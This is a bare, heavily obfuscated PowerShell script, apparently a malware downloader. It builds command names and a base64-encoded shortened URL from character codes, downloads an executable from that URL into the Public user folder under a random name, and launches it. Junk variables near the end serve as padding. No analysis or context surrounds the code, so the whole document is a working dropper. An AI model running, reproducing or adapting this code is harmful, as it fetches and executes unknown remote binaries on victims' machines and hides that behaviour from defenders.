powershell.exe  - ExecutionPolicy UnRestricted  - Window 1 [void] $null;
$yzshlon = Get - Random  - Min 3  - Max 4;
$xpmve = ([char[]]([char]97..[char]122));
$qefuwsyimaz =  - join ($xpmve | Get - Random  - Count $yzshlon | % {
    [Char]$_
}

);
$pkmyuhaxif = [char]0x2e + [char]0x65 + [char]0x78 + [char]0x65;
$qtoampf = $qefuwsyimaz  +  $pkmyuhaxif;
$jqmyewgfp = [char]0x53 + [char]0x61 + [char]0x4c;
$dxltfgh = [char]0x49 + [char]0x45 + [char]0x58;
$vrwzmhub = [char]0x73 + [char]0x41 + [char]0x70 + [char]0x53;
sAL gprwqsfma $jqmyewgfp;
$gekqymoz = [char]0x4e + [char]0x65 + [char]0x74 + [char]0x2e + [char]0x57 + [char]0x65 + [char]0x62 + [char]0x43 + [char]0x6c + [char]0x69 + [char]0x65 + [char]0x6e + [char]0x74;
gprwqsfma tzyildgrnuqje $dxltfgh;
$kjzdp = [char]0x24 + [char]0x65 + [char]0x6e + [char]0x76 + [char]0x3a + [char]0x50 + [char]0x55 + [char]0x42 + [char]0x4c + [char]0x49 + [char]0x43|tzyildgrnuqje;
gprwqsfma ulptcvjs $vrwzmhub;
$tlowqax = $kjzdp  +  [char]0x5c  +  $qtoampf;;;;
$ztlvb = 'aHR0cDovL3JiLmd5L2NmanVwcw==';
$ztlvb = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ztlvb));
$tzqen = New - Object $gekqymoz;
$wuhod = $tzqen.DownloadData($ztlvb);
[IO.File]::WriteAllBytes($tlowqax, $wuhod);
ulptcvjs $tlowqax;;
$uzwnfmhvc = @($wzuikjxg, $fxiwur, $otixz, $dpozre);
foreach($pquzxjtyf in $uzwnfmhvc) {
    $null = $_
}

""